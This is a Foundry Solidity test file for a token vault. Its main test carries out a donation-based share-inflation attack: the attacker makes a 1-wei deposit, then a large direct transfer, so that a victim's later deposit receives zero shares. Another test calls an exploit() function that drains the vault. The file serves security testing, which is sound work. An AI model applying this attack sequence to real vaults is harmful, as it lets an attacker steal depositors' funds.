// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Vault} from "src/Vault.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";

/// The fixed versions of RG02, RG03, RG06, RG09 and RG10, side by side:
/// configuration in setUp, deployment handed to an owner, the attack from a
/// dedicated address, a donation done with transfer, and a measured delta.
contract LocalDeploymentTest is Test {
    Vault vault;
    MockERC20 token;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token = new MockERC20();
        vault = new Vault(owner, address(token));
        vm.prank(owner);
        vault.setFee(30);
        deal(address(token), attacker, 1_001e18);
        deal(address(token), victim, 100e18);
        // Seeding the mock itself is fine: it is a test double.
        deal(address(token), address(token), 1e18);
    }

    function test_donationInflatesShares() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), 1_000e18);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(vault), 100e18);
        vault.deposit(100e18, victim);
        vm.stopPrank();

        uint256 before = token.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);
        assertGt(token.balanceOf(attacker), before + 50e18);
        assertEq(vault.balanceOf(victim), 0);
    }

    function testFuzz_roundTrip(uint256 amount) public {
        amount = bound(amount, 1, 1_000e18);
        vm.startPrank(attacker);
        token.approve(address(vault), amount);
        uint256 shares = vault.deposit(amount, attacker);
        uint256 assets = vault.redeem(shares, attacker, attacker);
        vm.stopPrank();
        assertLe(assets, amount);
    }

    function test_drainedToZero() public {
        vm.prank(attacker);
        vault.exploit();
        assertEq(token.balanceOf(address(vault)), 0);
    }
}
